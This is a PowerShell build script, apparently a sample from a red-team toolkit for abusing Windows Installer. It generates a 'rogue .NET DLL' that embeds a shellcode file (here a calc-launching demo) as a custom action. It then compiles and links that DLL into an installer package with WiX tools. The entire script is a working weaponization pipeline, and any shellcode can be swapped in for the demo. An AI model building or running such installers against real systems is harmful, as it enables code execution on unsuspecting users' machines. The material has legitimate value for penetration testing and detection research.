$architecture   = "x64"
$dotnetVer      = "v2"  # or "v4"
$shellcodePath  = "$(pwd)\calc64.bin"
$methodName     = "MyMethod"
$python         = "python"

$curDir = (pwd)
$projName = "sample3-run-calc-shellcode-via-dotnet.wxs"
$outMsi = "sample3-run-calc-shellcode-via-dotnet.mst"

$rogueDotNetPath = Join-Path -Path $curDir -ChildPath "..\tools\rogue-dot-net\generateRogueDotNet.py"
$candle = Join-Path -Path $curDir -ChildPath "..\tools\wix\candle.exe"
$light = Join-Path -Path $curDir -ChildPath "..\tools\wix\light.exe"
$makesfxca = Join-Path -Path $curDir -ChildPath "..\tools\wix\MakeSfxCA.exe"
$referencePath = Join-Path -Path $curDir -ChildPath "..\tools\wix\Microsoft.Deployment.WindowsInstaller.dll"
$sfxcaPath = Join-Path -Path $curDir -ChildPath "..\tools\wix\$architecture\sfxca.dll"

$customActionCAPath = Join-Path -Path $curDir -ChildPath "CustomAction.CA.dll"
$customActionPath = Join-Path -Path $curDir -ChildPath "CustomAction.dll"
$projectPath = Join-Path -Path $curDir -ChildPath $projName
$objPath = $projectPath -Replace ".wxs", ".wixobj"
$outMsiPath = Join-Path -Path $curDir -ChildPath $outMsi

Write-Host "`n[+] Step 1: Generating rogue .NET DLL..." -ForegroundColor green
& "$python" "$rogueDotNetPath" -M --dotnet-ver $dotnetVer -t plain -s CustomAction -n CustomActions -m $methodName -r -c $architecture -o "$customActionPath" "$shellcodePath"

Write-Host "`n[+] Step 2: Building SFX Custom Action DLL..." -ForegroundColor green
& "$makesfxca" "$customActionCAPath" "$sfxcaPath" "$customActionPath" "$referencePath"

Write-Host "`n[+] Step 3: Compiling .wxs into .wixobj with Candle..." -ForegroundColor green
& "$candle" "$projectPath" -arch "$architecture"

Write-Host "`n[+] Step 4: Linking .wixobj into .msi with Light..." -ForegroundColor green
& "$light" -ext WixUIExtension -cultures:en-us -dcl:high -out "$outMsiPath" "$objPath"

del "$curDir\*.wixpdb"
del "$curDir\*.wixobj"

Write-Host "`n[+] Done." -ForegroundColor green